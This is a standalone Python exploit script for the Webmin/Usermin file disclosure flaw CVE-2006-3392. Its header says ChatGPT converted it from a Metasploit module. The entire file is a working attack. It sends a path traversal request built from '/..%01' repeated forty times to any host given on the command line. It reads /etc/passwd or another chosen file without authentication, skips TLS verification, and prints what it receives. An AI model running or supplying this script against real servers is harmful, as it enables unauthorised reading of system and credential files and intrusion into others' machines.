#!/usr/bin/env python3
"""
Webmin / Usermin File Disclosure (CVE-2006-3392)
Converted from Metasploit auxiliary module to Python

Author (original): Matteo Cantoni <goony[at]nothink.org>
Converted to Python: ChatGPT
"""

import requests
import urllib.parse
import sys

# Disable SSL warnings (Webmin often uses self-signed certs)
requests.packages.urllib3.disable_warnings()


class WebminFileDisclosure:
    def __init__(self, target, port=10000, rpath="/etc/passwd", webmin_dir="/unauthenticated"):
        self.target = target
        self.port = port
        self.rpath = rpath
        self.webmin_dir = webmin_dir

    def build_url(self):
        """
        Build the malicious traversal URL
        """
        base_dir = urllib.parse.quote(self.webmin_dir)
        file_path = urllib.parse.quote(self.rpath)

        traversal = "/..%01" * 40
        uri = f"{base_dir}{traversal}{file_path}"

        url = f"https://{self.target}:{self.port}{uri}"
        return url

    def run(self):
        print(f"[+] Attempting to retrieve: {self.rpath}")

        url = self.build_url()
        print(f"[+] Target URL: {url}")

        try:
            response = requests.get(url, verify=False, timeout=10)

            print(f"[+] Server returned: {response.status_code} {response.reason}")

            if response.text:
                print("\n========== FILE CONTENT ==========")
                print(response.text)
                print("=================================")
            else:
                print("[-] Empty response body")

        except requests.exceptions.RequestException as e:
            print(f"[-] No response from the server: {e}")


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [port] [file] [dir]")
        print(f"Example: {sys.argv[0]} 192.168.1.10 10000 /etc/passwd /unauthenticated")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 10000
    file_path = sys.argv[3] if len(sys.argv) > 3 else "/etc/passwd"
    webmin_dir = sys.argv[4] if len(sys.argv) > 4 else "/unauthenticated"

    exploit = WebminFileDisclosure(
        target=target,
        port=port,
        rpath=file_path,
        webmin_dir=webmin_dir
    )
    exploit.run()


if __name__ == "__main__":
    main()
